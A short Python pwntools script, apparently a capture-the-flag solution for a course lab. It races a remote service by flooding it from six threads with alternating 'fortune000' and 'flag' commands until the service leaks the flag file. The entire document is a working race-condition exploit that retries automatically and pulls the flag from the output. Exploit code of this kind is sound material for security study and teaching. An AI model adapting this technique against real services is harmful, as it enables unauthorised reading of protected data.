#!/usr/bin/env python3
from pwn import *
import threading, time

HOST, PORT = 'up.zoolab.org', 10931
GOOD = b'fortune000'
BAD  = b'flag'
THREADS = 6
BURST   = 32
TIMEOUT = 40

context.log_level = 'info'

def spam(io, stop):
    payload = (GOOD + b'\n' + BAD + b'\n') * BURST
    while not stop.is_set():
        try:
            io.send(payload)
        except Exception:
            break

def attempt():
    io = remote(HOST, PORT)
    io.recvuntil(b'Commands:')
    stop = threading.Event()
    ths = [threading.Thread(target=spam, args=(io, stop), daemon=True)
           for _ in range(THREADS)]
    for t in ths: t.start()

    flag = None
    t0 = time.time()
    try:
        while time.time() - t0 < TIMEOUT:
            line = io.recvline(timeout=0.2)
            if line and line.startswith(b'F> '):
                msg = line.split(b'F> ')[1].strip()
                if b'FLAG{' in msg or b'flag{' in msg.lower():
                    flag = msg.decode()
                    break
    finally:
        stop.set()
        io.close()
    return flag

def main():
    n = 0
    while True:
        n += 1
        log.info(f'Attempt #{n}')
        flag = attempt()
        if flag:
            print('[+] FLAG =', flag)
            break
        log.warning('沒搶到，再試！')

if __name__ == '__main__':
    main()
